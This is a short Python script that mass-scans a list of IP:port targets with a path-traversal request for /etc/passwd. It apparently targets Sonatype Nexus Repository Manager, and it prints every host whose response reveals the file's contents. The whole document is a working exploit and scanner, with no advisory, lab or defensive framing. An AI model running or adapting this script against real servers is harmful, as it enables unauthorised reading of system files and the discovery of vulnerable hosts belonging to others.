import requests

def read_ip_port_list(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    return [line.strip() for line in lines]

def make_request(ip_port):
    url = f"http://{ip_port}/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd"
    try:
        response = requests.get(url, timeout=5)  # you can adjust the timeout as needed
        if "nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false" not in response.text and "Not Found" not in response.text and "400 Bad Request" not in response.text and "root" in response.text:
            print(f"{ip_port}")
    except requests.RequestException as e:
        pass

def main():
    ip_port_list = read_ip_port_list('all.txt')
    for ip_port in ip_port_list:
        make_request(ip_port)

if __name__ == "__main__":
    main()
